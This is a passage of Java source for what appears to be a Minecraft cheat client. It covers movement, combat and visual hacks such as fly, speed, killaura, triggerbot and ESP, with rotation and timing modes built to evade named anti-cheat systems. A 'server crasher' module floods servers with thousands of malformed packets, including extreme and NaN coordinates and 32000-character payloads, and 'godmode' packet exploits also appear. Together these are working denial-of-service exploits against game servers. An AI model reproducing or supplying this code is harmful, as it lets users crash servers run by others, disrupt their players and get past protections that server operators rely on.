                    p.noClip = true;
                    if (p.age % 2 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() - 0.01, p.getZ(), false));
                    }
                }
                p.fallDistance = 0;
            } else if (!freecamOn) {
                p.noClip = false;
            }

            // ── FREECAM ──
            if (freecamOn) {
                p.noClip = true;
                p.getAbilities().flying = true;
                double vy = 0;
                if (mc.options.jumpKey.isPressed()) vy = 0.5;
                if (mc.options.sneakKey.isPressed()) vy = -0.5;
                float fw = p.input.movementForward;
                float st = p.input.movementSideways;
                double vx = 0, vz = 0;
                if (fw != 0 || st != 0) {
                    double yaw = Math.toRadians(p.getYaw());
                    double angle = yaw - Math.atan2(fw, st) + Math.PI / 2;
                    vx = -Math.sin(angle) * 0.5;
                    vz = Math.cos(angle) * 0.5;
                }
                p.setVelocity(vx, vy, vz);
            }

            // ── SERVER CRASHER ──
            if (serverCrasherOn) {
                if (crasherStartTime == 0) crasherStartTime = System.currentTimeMillis();
                long elapsed = System.currentTimeMillis() - crasherStartTime;

                if ((crasherTimerMode == 1 && elapsed > 5000) || (crasherTimerMode == 2 && elapsed > 10000)) {
                    serverCrasherOn = false;
                    crasherStartTime = 0;
                } else if (mc.getNetworkHandler() == null && crasherTimerMode == 3) {
                    serverCrasherOn = false;
                    crasherStartTime = 0;
                }
            } else {
                crasherStartTime = 0;
            }

            if (serverCrasherOn && mc.getNetworkHandler() != null) {
                if (crasherMode == 0) { // Position
                    for (int i = 0; i < 1000; i++) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX() + 9999999, p.getY() + 9999999, p.getZ() + 9999999, true));
                    }
                } else if (crasherMode == 1) { // Swing
                    for (int i = 0; i < 5000; i++) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.HandSwingC2SPacket(Hand.MAIN_HAND));
                    }
                } else if (crasherMode == 2) { // Interact
                    for (int i = 0; i < 1000; i++) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                    }
                } else if (crasherMode == 3) { // MathBreaker (NaN/Infinity)
                    for (int i = 0; i < 100; i++) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(Double.NaN, Double.POSITIVE_INFINITY, Double.NaN, true));
                    }
                } else if (crasherMode == 4) { // BrandPayload
                    net.minecraft.network.PacketByteBuf buf = new net.minecraft.network.PacketByteBuf(io.netty.buffer.Unpooled.buffer());
                    buf.writeString("A".repeat(32000));
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket(new net.minecraft.util.Identifier("minecraft:brand"), buf));
                } else if (crasherMode == 5) { // SettingsExploit
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.ClientSettingsC2SPacket("A".repeat(32000), mc.options.getViewDistance().getValue(), net.minecraft.client.option.ChatVisibility.FULL, true, 0, net.minecraft.util.Arm.LEFT, true, true));
                } else if (crasherMode == 6) { // TabComplete
                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket(0, "/" + "A".repeat(32000)));
                }
            }

            // ── GODMODE ──
            if (godModeOn) {
                if (godModeMode == 0) { // Vanilla
                    // Do nothing, client can't enforce godmode in vanilla without packets
                } else if (godModeMode == 1) { // Packet
                    if (p.age % 10 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() - 0.1, p.getZ(), false));
                    }
                } else if (godModeMode == 2) { // Vulcan
                    if (p.age % 5 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround(p.getX(), p.getY() + 1337.0, p.getZ(), true));
                    }
                } else if (godModeMode == 3) { // LiquidBounce (Riding/Dismount exploit)
                    if (p.age % 3 == 0) {
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket(p, net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket.Mode.PRESS_SHIFT_KEY));
                        mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket(p, net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket.Mode.RELEASE_SHIFT_KEY));
                    }
                }
            }

            // ── DROP ALL ITEMS ──
            if (dropAllItems) {
                for (int i = 9; i < 45; i++) {
                    if (!p.playerScreenHandler.getSlot(i).getStack().isEmpty()) {
                        mc.interactionManager.clickSlot(p.playerScreenHandler.syncId, i, 1, net.minecraft.screen.slot.SlotActionType.THROW, p);
                    }
                }
                dropAllItems = false;
            }

            // ── AUTOARMOR ──
            if (autoArmorOn && p.age % 4 == 0 && mc.currentScreen == null && mc.interactionManager != null) {
                for (int type = 0; type < 4; type++) {
                    net.minecraft.item.ItemStack currentArmor = p.getInventory().getArmorStack(type);
                    int bestSlot = -1;
                    int bestScore = currentArmor.isEmpty() ? -1 : getArmorScore(currentArmor);

                    for (int i = 9; i < 36; i++) {
                        net.minecraft.item.ItemStack stack = p.getInventory().getStack(i);
                        if (!stack.isEmpty() && stack.getItem() instanceof net.minecraft.item.ArmorItem armorItem) {
                            if (armorItem.getSlotType().getEntitySlotId() == type) {
                                int score = getArmorScore(stack);
                                if (score > bestScore) {
                                    bestScore = score;
                                    bestSlot = i;
                                }
                            }
                        }
                    }

                    if (bestSlot != -1) {
                        if (!currentArmor.isEmpty()) {
                            mc.interactionManager.clickSlot(p.playerScreenHandler.syncId, 8 - type, 0, net.minecraft.screen.slot.SlotActionType.QUICK_MOVE, p);
                        }
                        mc.interactionManager.clickSlot(p.playerScreenHandler.syncId, bestSlot, 0, net.minecraft.screen.slot.SlotActionType.QUICK_MOVE, p);
                        break;
                    }
                }
            }

            // ── FASTBOW ──
            if (fastBowOn && p.getMainHandStack().getItem() == net.minecraft.item.Items.BOW && mc.options.useKey.isPressed()) {
                mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket(net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket.Action.RELEASE_USE_ITEM, net.minecraft.util.math.BlockPos.ORIGIN, net.minecraft.util.math.Direction.DOWN));
                mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));

                if (bowJump && p.isOnGround()) {
                    p.jump();
                    p.setPitch(-90);
                }
            }

            // ── AUTOCLICKER ──
            boolean isClicking = autoClickerRight ? mc.options.useKey.isPressed() : mc.options.attackKey.isPressed();
            if (autoClickerOn && isClicking && mc.currentScreen == null) {
                clickTimer++;
                int delay = (int) (20f / Math.max(1f, clickerCps));
                if (clickTimer >= delay) {
                    clickTimer = 0;
                    if (autoClickerRight) {
                        if (autoClickerFarm && mc.crosshairTarget != null && mc.crosshairTarget.getType() == HitResult.Type.BLOCK) {
                            net.minecraft.util.math.BlockPos pos = ((net.minecraft.util.hit.BlockHitResult) mc.crosshairTarget).getBlockPos();
                            Block block = mc.world.getBlockState(pos).getBlock();
                            if (block == net.minecraft.block.Blocks.WHEAT || block == net.minecraft.block.Blocks.CARROTS || block == net.minecraft.block.Blocks.POTATOES) {
                                mc.interactionManager.interactBlock(p, Hand.MAIN_HAND, (net.minecraft.util.hit.BlockHitResult) mc.crosshairTarget);
                            }
                        } else {
                            mc.interactionManager.interactItem(p, Hand.MAIN_HAND);
                        }
                        p.swingHand(Hand.MAIN_HAND);
                    } else {
                        if (mc.crosshairTarget != null && mc.crosshairTarget.getType() == HitResult.Type.ENTITY) {
                            mc.interactionManager.attackEntity(p, ((EntityHitResult) mc.crosshairTarget).getEntity());
                        }
                        p.swingHand(Hand.MAIN_HAND);
                    }
                }
            } else {
                clickTimer = 0;
            }

            // ── TRIGGERBOT ──
            if (triggerBotOn && mc.currentScreen == null) {
                triggerTimer++;
                int delay = (int) (20f / Math.max(1f, triggerCps));
                if (triggerTimer >= delay) {
                    triggerTimer = 0;
                    if (mc.crosshairTarget != null && mc.crosshairTarget.getType() == HitResult.Type.ENTITY) {
                        Entity target = ((EntityHitResult) mc.crosshairTarget).getEntity();
                        if (target instanceof LivingEntity && target.isAlive() && target != p) {
                            boolean isWeapon = p.getMainHandStack().getItem() instanceof SwordItem || p.getMainHandStack().getItem() instanceof AxeItem;
                            if (!triggerWeaponOnly || isWeapon) {
                                if (p.distanceTo(target) <= triggerRange && !friends.contains(target.getName().getString())) {
                                    if (p.getAttackCooldownProgress(0.0f) >= 0.95f && ((LivingEntity) target).hurtTime == 0) {
                                        if (mc.interactionManager != null) {
                                            mc.interactionManager.attackEntity(p, target);
                                            p.swingHand(Hand.MAIN_HAND);
                                            p.resetLastAttackedTicks();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                triggerTimer = 0;
            }

            // ── FULLBRIGHT ──
            if (fullBrightOn) {
                p.addStatusEffect(new net.minecraft.entity.effect.StatusEffectInstance(net.minecraft.entity.effect.StatusEffects.NIGHT_VISION, 1000, 0, false, false, false));
                wasFullBright = true;
            } else if (wasFullBright) {
                if (p.hasStatusEffect(net.minecraft.entity.effect.StatusEffects.NIGHT_VISION)) {
                    p.removeStatusEffect(net.minecraft.entity.effect.StatusEffects.NIGHT_VISION);
                }
                wasFullBright = false;
            }

            // ── VISUALS (ESP & SUB-FUNCTIONS) ──
            if (visualsOn) {
                mc.world.getEntities().forEach(e -> {
                    if (e instanceof LivingEntity && e != p) {
                        boolean isFriend = friends.contains(e.getName().getString());
                        boolean shouldGlow = false;
                        if (visualsTargetMode == 0) shouldGlow = true;
                        else if (visualsTargetMode == 1 && !isFriend) shouldGlow = true;
                        else if (visualsTargetMode == 2 && isFriend) shouldGlow = true;
                        e.setGlowing(shouldGlow);
                    }
                });
                visualsWasOn = true;

                if (noFireOn && p.isOnFire()) {
                    p.setFireTicks(0);
                }
                if (noNauseaOn && p.hasStatusEffect(net.minecraft.entity.effect.StatusEffects.NAUSEA)) {
                    p.removeStatusEffect(net.minecraft.entity.effect.StatusEffects.NAUSEA);
                }
                if (targetEspOn && currentTarget != null && currentTarget.isAlive()) {
                    double r = currentTarget.getWidth() * 1.2;
                    for (int i = 0; i < 5; i++) {
                        double angle = (System.currentTimeMillis() / 5.0 + i * 72) % 360;
                        double rad = Math.toRadians(angle);
                        double px = currentTarget.getX() + Math.cos(rad) * r;
                        double pz = currentTarget.getZ() + Math.sin(rad) * r;

                        // Feet circle (Soup Visuals style)
                        mc.world.addParticle(net.minecraft.particle.ParticleTypes.HAPPY_VILLAGER, px, currentTarget.getY(), pz, 0, 0, 0);

                        // Halo above head
                        mc.world.addParticle(net.minecraft.particle.ParticleTypes.END_ROD, px, currentTarget.getY() + currentTarget.getHeight() + 0.3, pz, 0, 0, 0);
                    }

                    // Outline box around target
                    double minX = currentTarget.getX() - currentTarget.getWidth() / 2;
                    double minY = currentTarget.getY();
                    double minZ = currentTarget.getZ() - currentTarget.getWidth() / 2;
                    double maxX = currentTarget.getX() + currentTarget.getWidth() / 2;
                    double maxY = currentTarget.getY() + currentTarget.getHeight();
                    double maxZ = currentTarget.getZ() + currentTarget.getWidth() / 2;

                    mc.world.addParticle(net.minecraft.particle.ParticleTypes.FLAME, minX, minY, minZ, 0, 0, 0);
                    mc.world.addParticle(net.minecraft.particle.ParticleTypes.FLAME, maxX, maxY, maxZ, 0, 0, 0);
                }
            } else if (visualsWasOn) {
                mc.world.getEntities().forEach(e -> {
                    if (e instanceof LivingEntity && e != p) e.setGlowing(false);
                });
                visualsWasOn = false;
            }

            // ── AIM ASSIST & AIMLOCK ──
            if ((aimOn || aimLockOn) && mc.currentScreen == null && !auraOn) {
                var list = mc.world.getOtherEntities(p, p.getBoundingBox().expand(15), e -> e instanceof LivingEntity && e.isAlive() && !e.isSpectator());
                Entity target = list.stream().min(Comparator.comparingDouble(e -> e.distanceTo(p))).orElse(null);
                if (target != null) {
                    float[] rots = getRotations(p, target);
                    if (aimLockOn) {
                        p.setYaw(rots[0]);
                        p.setPitch(rots[1]);
                    } else {
                        p.setYaw(p.getYaw() + (rots[0] - p.getYaw()) * (aimSpeed / 100f));
                        p.setPitch(p.getPitch() + (rots[1] - p.getPitch()) * (aimSpeed / 100f));
                    }
                }
            }

            // ── STRAFE ──
            if (strafeOn && mc.currentScreen == null) {
                if (p.input.movementForward != 0 || p.input.movementSideways != 0) {
                    if (p.isOnGround()) p.jump();
                    double yaw = Math.toRadians(p.getYaw());
                    double angle = yaw - Math.atan2(p.input.movementForward, p.input.movementSideways) + Math.PI / 2;
                    double spd = 0.26;
                    p.setVelocity(-Math.sin(angle) * spd, p.getVelocity().y, Math.cos(angle) * spd);
                }
            }

            // ── SPEED ──
            if (speedOn && mc.currentScreen == null && !strafeOn) {
                float fw = p.input.movementForward;
                float st = p.input.movementSideways;
                if (fw != 0 || st != 0) {
                    double yaw   = Math.toRadians(p.getYaw());
                    double spd   = speedVal / 20.0;
                    double angle = yaw - Math.atan2(fw, st) + Math.PI / 2;
                    double vx = -Math.sin(angle) * spd;
                    double vz =  Math.cos(angle) * spd;

                    switch (speedBypass) {
                        case 4 -> { // NCP
                            if (p.isOnGround()) p.jump();
                            else { vx *= 1.02; vz *= 1.02; p.setVelocity(p.getVelocity().x, p.getVelocity().y - 0.02, p.getVelocity().z); }
                        }
                        case 5 -> { // Matrix
                            if (p.isOnGround()) p.jump();
                            vx *= 1.01; vz *= 1.01;
                        }
                        case 6 -> { // Grim
                            spd = 0.28;
                            vx = -Math.sin(angle) * spd; vz = Math.cos(angle) * spd;
                        }
                        case 7 -> { // Funtime
                            if (p.isOnGround()) p.jump();
                            vx *= 1.005; vz *= 1.005;
                        }
                        case 8 -> { // ReallyWorld
                            spd = 0.26;
                            vx = -Math.sin(angle) * spd; vz = Math.cos(angle) * spd;
                        }
                        case 9 -> { // Vulcan
                            if (p.isOnGround()) p.jump();
                            if (p.age % 2 == 0) { vx *= 1.01; vz *= 1.01; }
                        }
                        case 10 -> { // Spartan
                            spd = 0.25;
                            vx = -Math.sin(angle) * spd; vz = Math.cos(angle) * spd;
                        }
                    }
                    p.setVelocity(vx, p.getVelocity().y, vz);
                }
            }

            // ── FLY ──
            if (flyOn) {
                p.getAbilities().flying = true;
                double vy = 0;
                if (mc.options.jumpKey.isPressed())   vy =  flySpeed / 10.0;
                if (mc.options.sneakKey.isPressed())   vy = -flySpeed / 10.0;

                float fw = p.input.movementForward;
                float st = p.input.movementSideways;
                double vx = p.getVelocity().x;
                double vz = p.getVelocity().z;

                if (fw != 0 || st != 0) {
                    double yaw   = Math.toRadians(p.getYaw());
                    double spd   = flySpeed / 20.0;
                    double angle = yaw - Math.atan2(fw, st) + Math.PI / 2;
                    vx = -Math.sin(angle) * spd;
                    vz =  Math.cos(angle) * spd;
                } else { vx = 0; vz = 0; }

                switch (flyBypass) {
                    case 4 -> vy = -0.04; // NCP
                    case 5 -> { if (p.age % 10 == 0) vy = 0.1; else vy = -0.05; } // Matrix
                    case 6 -> vy = 0; // Grim
                    case 7 -> vy = -0.01; // Funtime
                    case 8 -> vy = -0.03; // ReallyWorld
                    case 9 -> { if (p.age % 5 == 0) vy = 0.05; else vy = -0.05; } // Vulcan
                    case 10 -> vy = -0.02; // Spartan
                }
                p.setVelocity(vx, vy, vz);
            } else {
                if (mc.player != null && !mc.player.isCreative() && !mc.player.isSpectator()) {
                    mc.player.getAbilities().flying = false;
                }
            }

            // ── KILLAURA (ROBUST 1.9+ LOGIC) ──
            if (auraOn) {
                auraTick++;

                // Smooth rotation logic
                if (isRotating && (auraRotMode == 2 || auraRotMode == 16 || auraRotMode == 17)) {
                    if (auraRotMode == 2) {
                        p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.4f);
                        p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.4f);
                    } else if (auraRotMode == 16) {
                        float smoothFactor = 0.01f + (auraStickiness / 100f) * 0.99f; // 0.01 to 1.0
                        float diffYaw = targetYaw - p.getYaw();
                        float diffPitch = targetPitch - p.getPitch();

                        // Apply curve
                        if (auraRotCurve > 0) {
                            float curve = (auraRotCurve / 100f) * 30.0f;
                            diffYaw += (float)(Math.sin(auraTick * 0.2) * curve);
                            diffPitch += (float)(Math.cos(auraTick * 0.2) * curve);
                        }

                        p.setYaw(p.getYaw() + diffYaw * smoothFactor);
                        p.setPitch(p.getPitch() + diffPitch * smoothFactor);
                    } else if (auraRotMode == 17) {
                        float diffYaw = targetYaw - p.getYaw();
                        float diffPitch = targetPitch - p.getPitch();

                        // Base smoothing
                        float smoothFactor = 0.05f + (auraStickiness / 100f) * 0.95f;

                        // Add looping effect (figure-8 pattern)
                        float loopSize = (auraRotCurve / 100f) * 40.0f;
                        float loopSpeed = 0.3f;

                        diffYaw += (float)(Math.sin(auraTick * loopSpeed) * loopSize);
                        diffPitch += (float)(Math.sin(auraTick * loopSpeed * 2.0) * loopSize * 0.5f);

                        p.setYaw(p.getYaw() + diffYaw * smoothFactor);
                        p.setPitch(p.getPitch() + diffPitch * smoothFactor);
                    }
                }

                if (auraHitInGuis || mc.currentScreen == null) {
                    var list = mc.world.getOtherEntities(p, p.getBoundingBox().expand(auraRange), e -> {
                        if (!(e instanceof LivingEntity) || !e.isAlive() || e == p || e.isSpectator()) return false;
                        if (friends.contains(e.getName().getString())) return false;

                        boolean isPlayer = e instanceof net.minecraft.entity.player.PlayerEntity;
                        boolean isMob = e instanceof net.minecraft.entity.mob.HostileEntity;
                        boolean isAnimal = e instanceof net.minecraft.entity.passive.AnimalEntity;

                        if (isPlayer && !auraTargetPlayers) return false;
                        if (isMob && !auraTargetMobs) return false;
                        if (isAnimal && !auraTargetAnimals) return false;

                        if (antiBotOn) {
                            if (e.isInvisible() || e.age < 20 || e.getName().getString().isEmpty() || e.getName().getString().contains(" ")) return false;
                        }

                        // FOV Check
                        if (auraFov < 360f) {
                            float[] rots = getRotations(p, e);
                            float yawDiff = Math.abs(net.minecraft.util.math.MathHelper.wrapDegrees(p.getYaw() - rots[0]));
                            if (yawDiff > auraFov / 2f) return false;
                        }

                        return true;
                    });

                    LivingEntity target = null;
                    if (!list.isEmpty()) {
                        switch (auraTargetMode) {
                            case 0 -> target = (LivingEntity) list.stream().min(Comparator.comparingDouble(e -> e.distanceTo(p))).orElse(null); // Distance
                            case 1 -> target = (LivingEntity) list.stream().min(Comparator.comparingDouble(e -> ((LivingEntity)e).getHealth())).orElse(null); // Health
                            case 2 -> target = (LivingEntity) list.stream().min(Comparator.comparingDouble(e -> ((LivingEntity)e).getArmor())).orElse(null); // Armor
                            case 3 -> target = (LivingEntity) list.stream().min(Comparator.comparingDouble(e -> getAngleDifference(p, e))).orElse(null); // Angle
                        }
                    }

                    currentTarget = target;

                    if (target != null && p.distanceTo(target) <= auraRange) {
                        if (!auraThroughWalls && !p.canSee(target)) target = null;

                        if (target != null) {

                            // 1. Calculate Rotations
                            float[] rots = getRotations(p, target);
                            float idealYaw = rots[0];
                            float idealPitch = rots[1];

                            // Apply auraRotSpeed limit
                            if (auraRotSpeed < 180.0f) {
                                float diffYaw = net.minecraft.util.math.MathHelper.wrapDegrees(idealYaw - p.getYaw());
                                float diffPitch = idealPitch - p.getPitch();

                                if (diffYaw > auraRotSpeed) diffYaw = auraRotSpeed;
                                if (diffYaw < -auraRotSpeed) diffYaw = -auraRotSpeed;
                                if (diffPitch > auraRotSpeed) diffPitch = auraRotSpeed;
                                if (diffPitch < -auraRotSpeed) diffPitch = -auraRotSpeed;

                                targetYaw = p.getYaw() + diffYaw;
                                targetPitch = p.getPitch() + diffPitch;
                            } else {
                                targetYaw = idealYaw;
                                targetPitch = idealPitch;
                            }
                            isRotating = true;

                            // Apply Rotations based on mode
                            switch (auraRotMode) {
                                case 1 -> { // Snap
                                    p.setYaw(targetYaw);
                                    p.setPitch(targetPitch);
                                }
                                case 2 -> { // Smooth (handled above)
                                }
                                case 3 -> { // Silent
                                    mc.getNetworkHandler().sendPacket(new net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.LookAndOnGround(targetYaw, targetPitch, p.isOnGround()));
                                }
                                case 4 -> { // Matrix (Randomized Jitter)
                                    p.setYaw(targetYaw + (float)(Math.random() * 6 - 3));
                                    p.setPitch(targetPitch + (float)(Math.random() * 6 - 3));
                                }
                                case 5 -> { // Predict
                                    double predX = target.getX() + (target.getX() - target.prevX) * 2.0;
                                    double predZ = target.getZ() + (target.getZ() - target.prevZ) * 2.0;
                                    double dx = predX - p.getX();
                                    double dz = predZ - p.getZ();
                                    double dy = (target.getY() + target.getEyeHeight(target.getPose())) - (p.getY() + p.getEyeHeight(p.getPose()));
                                    double dist = Math.sqrt(dx * dx + dz * dz);
                                    targetYaw = (float) Math.toDegrees(Math.atan2(dz, dx)) - 90.0f;
                                    targetPitch = (float) -Math.toDegrees(Math.atan2(dy, dist));
                                    p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.5f);
                                    p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.5f);
                                }
                                case 6 -> { // Smart (Super smooth, free but snapping)
                                    targetYaw += (float)((Math.random() - 0.5) * 4.0);
                                    targetPitch += (float)((Math.random() - 0.5) * 4.0);
                                    p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.25f);
                                    p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.25f);
                                }
                                case 7 -> { // Legit (Smooth, no jitter, precise)
                                    p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.15f);
                                    p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.15f);
                                }
                                case 8 -> { // HvH (Instant snap, max precision)
                                    p.setYaw(targetYaw);
                                    p.setPitch(targetPitch);
                                }
                                case 9 -> { // Derp (Random crazy rotations, but hits target)
                                    targetYaw += (float)((Math.random() - 0.5) * 360.0);
                                    targetPitch += (float)((Math.random() - 0.5) * 180.0);
                                    p.setYaw(targetYaw);
                                    p.setPitch(targetPitch);
                                }
                                case 10 -> { // Cinematic (Extremely smooth)
                                    p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.05f);
                                    p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.05f);
                                }
                                case 11 -> { // NCP (Strict limits on rotation speed)
                                    float diffYaw = targetYaw - p.getYaw();
                                    float diffPitch = targetPitch - p.getPitch();
                                    diffYaw = Math.max(-30f, Math.min(30f, diffYaw));
                                    diffPitch = Math.max(-15f, Math.min(15f, diffPitch));
                                    p.setYaw(p.getYaw() + diffYaw);
                                    p.setPitch(p.getPitch() + diffPitch);
                                }
                                case 12 -> { // AAC (Specific jitter)
                                    p.setYaw(targetYaw + (float)(Math.sin(System.currentTimeMillis() / 100.0) * 2.0));
                                    p.setPitch(targetPitch + (float)(Math.cos(System.currentTimeMillis() / 100.0) * 2.0));
                                }
                                case 13 -> { // Sunrise (Specific RU server bypass)
                                    targetYaw += (float)((Math.random() - 0.5) * 1.5);
                                    targetPitch += (float)((Math.random() - 0.5) * 1.5);
                                    p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.4f);
                                    p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.4f);
                                }
                                case 14 -> { // Vulcan (Vulcan AC specific rotations)
                                    float diffYaw = targetYaw - p.getYaw();
                                    diffYaw = Math.round(diffYaw / 0.5f) * 0.5f; // Round to nearest 0.5
                                    p.setYaw(p.getYaw() + diffYaw * 0.8f);
                                    p.setPitch(targetPitch);
                                }
                                case 15 -> { // Intave (Very strict, needs to be perfectly aligned but with slight realistic jitter, and no snapping)
                                    p.setYaw(p.getYaw() + (targetYaw - p.getYaw()) * 0.1f + (float)(Math.random() - 0.5) * 0.5f);
                                    p.setPitch(p.getPitch() + (targetPitch - p.getPitch()) * 0.1f + (float)(Math.random() - 0.5) * 0.5f);
                                }
                                case 16 -> { // Legit Smooth (handled above)
                                }
                                case 17 -> { // Looping (handled above)
                                }
                                case 18 -> { // LiquidBounce
                                    float diffYaw = targetYaw - p.getYaw();
                                    float diffPitch = targetPitch - p.getPitch();

                                    // LiquidBounce uses a specific randomized step
                                    float step = 40.0f + (float)Math.random() * 10.0f;
                                    diffYaw = Math.max(-step, Math.min(step, diffYaw));
                                    diffPitch = Math.max(-step, Math.min(step, diffPitch));

                                    p.setYaw(p.getYaw() + diffYaw);
                                    p.setPitch(p.getPitch() + diffPitch);
                                }
                                case 19 -> { // Custom
                                    float diffYaw = targetYaw - p.getYaw();
                                    float diffPitch = targetPitch - p.getPitch();
                                    float smooth = 0.01f + (auraStickiness / 100f) * 0.99f;
                                    p.setYaw(p.getYaw() + diffYaw * smooth);
                                    p.setPitch(p.getPitch() + diffPitch * smooth);
                                }
                                case 20 -> { // Noise
                                    float noiseYaw = (float)(Math.sin(auraTick * 0.5) * (auraRotCurve / 100f) * 20.0f);
                                    float noisePitch = (float)(Math.cos(auraTick * 0.5) * (auraRotCurve / 100f) * 20.0f);
                                    p.setYaw(targetYaw + noiseYaw);
                                    p.setPitch(targetPitch + noisePitch);
                                }
                            }

                            // 2. Check if we can hit
                            boolean canHit = false;

                            // STRICT 1.9 COOLDOWN CHECK
                            float cooldown = p.getAttackCooldownProgress(0.0f);

                            switch (auraMode) {
                                case 0 -> { // 1.9 Strict
                                    // Must be exactly 1.0f or higher to ensure full damage and no spam
                                    if (cooldown >= 1.0f) {
                                        canHit = true;
                                    }
                                }
                                case 1 -> { // 1.8 Spam
                                    canHit = auraTick % 2 == 0;
                                }
                                case 2 -> { // Adaptive (Randomized cooldown to bypass anti-cheats)
                                    if (cooldown >= (0.85f + Math.random() * 0.15f)) {
                                        canHit = true;
                                    }
                                }
                            }

                            // Timing Check (Jump Phase)
                            if (canHit) {
                                if (auraTimingMode == 1) { // Fall (Crits)
                                    if (p.getVelocity().y >= 0 || p.isOnGround()) canHit = false;
                                }
                            }

                            // Raycast check (if enabled, ensure we are actually looking at them)
                            if (canHit && auraRayCast && auraRotMode != 3) { // If not silent
                                double dToT = p.distanceTo(target);
                                Vec3d eyePos = p.getCameraPosVec(1.0f);
                                Vec3d lookVec = p.getRotationVec(1.0f);
                                Vec3d traceEnd = eyePos.add(lookVec.x * dToT, lookVec.y * dToT, lookVec.z * dToT);
                                HitResult hit = mc.world.raycast(new RaycastContext(eyePos, traceEnd, RaycastContext.ShapeType.OUTLINE, RaycastContext.FluidHandling.NONE, p));
                                // If we hit a block before the entity, don't hit (unless through walls is on)
                                if (!auraThroughWalls && hit.getType() == HitResult.Type.BLOCK) {
                                    canHit = false;
                                }
                            }

                            // 3. Bypasses
                            if (canHit) {
                                switch (auraBypass) {
                                    case 2 -> { if (auraTick % 3 != 0) canHit = false; }
                                    case 3 -> { // Strafe around
                                        double circleAngle = Math.toRadians(targetYaw + 90);
                                        p.setVelocity(-Math.sin(circleAngle) * 0.2, p.getVelocity().y, Math.cos(circleAngle) * 0.2);
                                    }
                                    case 5 -> { if (Math.random() > 0.8) canHit = false; } // Matrix
                                    case 6 -> { if (!p.canSee(target)) canHit = false; } // Grim
                                    case 7 -> { // Funtime
                                        if (Math.random() > 0.9) canHit = false;
                                        if (!p.canSee(target)) canHit = false;
                                    }
                                    case 8 -> { // ReallyWorld
                                        if (cooldown < 1.0f) canHit = false;
                                        if (!p.canSee(target)) canHit = false;
                                    }
                                    case 9 -> { // Vulcan
                                        if (p.age % 2 != 0) canHit = false;
                                    }
                                    case 10 -> { // Spartan
                                        if (p.distanceTo(target) > 3.5f) canHit = false;
                                    }
                                    case 11 -> { // Grim AC (Strict Raycast & Timing)
                                        if (cooldown < 1.0f) canHit = false;
                                        if (!p.canSee(target)) canHit = false;
                                        if (Math.abs(p.getYaw() - targetYaw) > 15) canHit = false; // Must be looking precisely
                                    }
                                    case 12 -> { // Polar AC (Randomized Delays & Smooth Rots)
                                        if (cooldown < 0.95f + Math.random() * 0.05f) canHit = false;
                                        if (auraTick % (2 + (int)(Math.random() * 2)) != 0) canHit = false; // Random hits
                                    }
                                    case 13 -> { // Intave
                                        if (cooldown < 1.0f) canHit = false;
                                        if (p.distanceTo(target) > 3.0f) canHit = false; // Strict reach
                                        if (Math.abs(p.getYaw() - targetYaw) > 20) canHit = false; // Must be looking at target
                                    }
                                }
                            }

                            // 4. Attack
                            if (canHit) {
                                // AutoWeapon
                                if (autoWeapon) {
                                    int bestSlot = -1;
                                    float bestDamage = -1;
                                    for (int i = 0; i < 9; i++) {
                                        ItemStack stack = p.getInventory().getStack(i);
                                        if (stack.getItem() instanceof SwordItem sword) {
                                            if (sword.getAttackDamage() > bestDamage) { bestDamage = sword.getAttackDamage(); bestSlot = i; }
                                        } else if (stack.getItem() instanceof AxeItem axe) {
                                            if (axe.getAttackDamage() > bestDamage) { bestDamage = axe.getAttackDamage(); bestSlot = i; }
                                        }
                                    }
                                    if (bestSlot != -1) p.getInventory().selectedSlot = bestSlot;
                                }

                                // Criticals (Mini-jump)
                                if (criticals && (p.isOnGround() || (waterCrits && p.isTouchingWater()))) {
                                    p.addVelocity(0, 0.1, 0);
                                    p.fallDistance = 0.1f;
                                    p.setOnGround(false);
                                }

                                // Visuals Particles
                                if (visualsOn && visualsParticles > 0) {
                                    net.minecraft.particle.ParticleEffect particle = net.minecraft.particle.ParticleTypes.CRIT;
